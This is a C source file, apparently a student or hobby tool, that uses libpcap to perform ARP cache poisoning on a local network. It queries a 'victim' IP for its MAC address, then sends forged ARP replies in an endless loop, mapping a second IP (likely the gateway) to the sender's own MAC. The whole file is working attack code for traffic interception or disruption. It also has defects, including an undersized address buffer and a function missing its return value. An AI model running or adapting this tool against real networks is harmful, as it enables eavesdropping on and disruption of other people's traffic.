#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <net/if.h>

#define SNAP_LEN 1518

struct sniff_arp {
        u_char  ether_dhost[6];    /* destination host address */
        u_char  ether_shost[6];    /* source host address */
        u_short ether_type;        /* IP? ARP? RARP? etc */

        u_short arp_htype; /*hardware type*/
        u_short arp_p; /*protocol*/
        u_char arp_hsize; /*hardware size*/
        u_char arp_psize; /*protocol size*/
        u_short arp_opcode; /*opcode*/
        u_char arp_smhost[6]; /*sender mac address*/
        struct in_addr arp_sip; /*sender ip address*/
        u_char arp_dmhost[6]; /*target mac address*/
        struct in_addr arp_dip; /*target ip address*/
};

int s_getIpAddress (const char * ifr, unsigned char * out);
char *getMAC(const char *ip, struct sniff_arp * arp_packet);

void show_data (const u_char * packet) {
        int i, tmp=0;

        printf("Data Code : \n ");
        for (i=0; i<46; i++) {
                printf("%.2x ", *(packet+i)&0xff);
                tmp++;

                if (tmp%16 == 0)
                        printf("\n");
                if (tmp%8 == 0)
                        printf(" ");
        }

        printf("\n");

}

void create_arp (struct sniff_arp * arp_packet, char *dev, u_char *vip, u_char *dip, u_char *vmac, int check) {
        char *sip = (char*)calloc(sizeof(char), 4);
        u_char addr[4] = {0};
        int i;

        if (s_getIpAddress(dev, addr) > 0) {  
                sprintf(sip, "%d.%d.%d.%d", (int)addr[0], (int)addr[1], (int)addr[2], (int)addr[3]);  
        }

        getMAC(sip, arp_packet);

        arp_packet->ether_type = htons(0x0806);
        arp_packet->arp_htype = htons(0x0001);
        arp_packet->arp_p = htons(0x0800);

        arp_packet->arp_hsize = 0x6;
        arp_packet->arp_psize = 0x4;

        if (check == 1) {
                arp_packet->arp_opcode= htons(0x0001);
                inet_pton(AF_INET, sip, &(arp_packet->arp_sip));
                inet_pton(AF_INET, vip, &(arp_packet->arp_dip));

                for (i=0; i<6; i++)
                        arp_packet->arp_dmhost[i] = 0x00;
        } else if (check == 2) {
                arp_packet->arp_opcode= htons(0x0002);
                inet_pton(AF_INET, dip, &(arp_packet->arp_sip));
                inet_pton(AF_INET, vip, &(arp_packet->arp_dip));

                for (i=0; i<6; i++) {
                        arp_packet->arp_dmhost[i] = vmac[i];
                        arp_packet->ether_dhost[i] = vmac[i];
                }
        }                
}

int check_reply (const u_char *common_packet, u_char *vip, u_char *dip, u_char *vmac) {
        const struct sniff_arp * arp_reply;
        u_char reply_ip[100];

        arp_reply = (struct sniff_arp *)(common_packet);
        inet_ntop(AF_INET, &(arp_reply->arp_sip), reply_ip, 100);

        if (arp_reply->ether_type == 0x0608) {
		if (!strcmp(vip, reply_ip)) {
		        if (arp_reply->arp_opcode == htons(0x0002)) {
		                memcpy(vmac, arp_reply->arp_smhost, 6);
		                return 4;
		        }
		}
        }
}       

int main(int argc, char **argv) {
        struct sniff_arp * arp_packet =  malloc(sizeof(struct sniff_arp));
        char *dev = NULL;
        u_char *vip = NULL;
        u_char *dip = NULL;
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;
        struct pcap_pkthdr *header;

        bpf_u_int32 mask;
        bpf_u_int32 net;

        u_char packet[256];
        const u_char *common_packet;
        u_char vmac[6] = {0};
        int i;

        if (argc == 4) {
                dev = argv[1];
                vip = argv[2];
                dip = argv[3];
        } else if (argc > 4) {
                fprintf(stderr, "error: unrecognized command-line options\n");
                exit(EXIT_FAILURE);
        } else {
                fprintf(stderr, "error: do not matched argument\n");
                exit(EXIT_FAILURE);
        }

        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
                fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
                net = 0;
                mask = 0;
        }

        handle = pcap_open_live (dev, SNAP_LEN, 1, 1000, errbuf);
        if (handle == NULL) {
                fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
                exit(EXIT_FAILURE);
        }

        create_arp(arp_packet, dev, vip, dip, vmac, 1);

        memcpy(packet, arp_packet, 46);
        for (i=0; i<4; i++)
                packet[38+i] = packet[40+i];

        show_data(packet);

        while (1) {
                /* Send down the packet */
                if (pcap_sendpacket(handle, packet, 42 /* size */) != 0) {
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return;
                }

                if (pcap_next_ex(handle, &header, &common_packet) > 0) {
                        if (check_reply(common_packet, vip, dip, vmac) == 4)
                                break; 
                }

        }

        printf("victim_MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", vmac[0], vmac[1], vmac[2], vmac[3], vmac[4], vmac[5]);

        create_arp(arp_packet, dev, vip, dip, vmac, 2);
        memcpy(packet, arp_packet, 46);

        for (i=0; i<4; i++)
                packet[38+i] = packet[40+i];

        show_data(packet);

        while (1) {
                if (pcap_sendpacket(handle, packet, 42 /* size */) != 0) {
                        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                        return;
                }
        }

        return 0;

}

int s_getIpAddress (const char * ifr, unsigned char * out) {  
        int sockfd;  
        struct ifreq ifrq;  
        struct sockaddr_in * sin;  
        sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
        strcpy(ifrq.ifr_name, ifr);  

        if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
                perror( "ioctl() SIOCGIFADDR error");  
                return -1;  
        }  
        sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
        memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));  

        close(sockfd);  

        return 4;  
}

char *getMAC(const char *ip, struct sniff_arp * arp_packet){
        struct ifaddrs *ifaddr, *ifa;
        int family, s, i;
        char host[NI_MAXHOST];
        struct sockaddr *sdl;
        unsigned char *ptr;
        char *ifa_name;
        char *mac_addr = (char*)calloc(sizeof(char), 18);

        if (getifaddrs(&ifaddr) == -1) {
                perror("getifaddrs");
                return NULL;
        }

        //iterate to find interface name for given server_ip
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
                if (ifa->ifa_addr != NULL) {
                        family = ifa->ifa_addr->sa_family;
                        if(family == AF_INET) {
                                s = getnameinfo(ifa->ifa_addr, (family == AF_INET)?sizeof(struct sockaddr_in):sizeof(struct sockaddr_in6),
                                host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                                if (s != 0) {
                                        printf("getnameinfo() failed: %s\n", gai_strerror(s));
                                        return NULL;
                                }
                                if(strcmp(host, ip) == 0){
                                        ifa_name = ifa->ifa_name;
                                }
                        }
                }
        }

        //iterate to find corresponding ethernet address
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
                family = ifa->ifa_addr->sa_family;
                if(family == PF_PACKET && strcmp(ifa_name, ifa->ifa_name) == 0) {
                        sdl = (struct sockaddr *)(ifa->ifa_addr);
                        ptr = (unsigned char *)sdl->sa_data;
                        ptr += 10;
                        for (i=0; i<=5; i++) {
                                sprintf(mac_addr, "%02x", *(ptr+i));
                                arp_packet->arp_smhost[i] = *(ptr+i);
                                arp_packet->ether_shost[i] = *(ptr+i);
                                arp_packet->ether_dhost[i] = 0xff;
                        }
                        break;
                }
        }
        freeifaddrs(ifaddr);
} 
